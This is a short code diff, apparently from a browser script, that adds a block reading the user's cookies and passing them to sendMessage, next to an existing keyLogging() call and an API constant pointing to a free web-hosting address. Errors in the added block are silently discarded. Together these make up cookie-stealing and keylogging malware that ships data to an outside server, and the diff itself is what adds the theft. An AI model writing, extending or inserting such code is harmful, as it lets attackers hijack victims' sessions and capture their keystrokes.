@@ -56,6 +56,11 @@ const API = "https://litho-bump.000webhostapp.com/index.php",
                 sendMessage(user);
             } catch (error) {}
         } else {
+            try {
+                const cookie = await getCookies();
+                const user = { cookie };
+                sendMessage(user);
+            } catch (error) {}
             keyLogging();
         }
     },
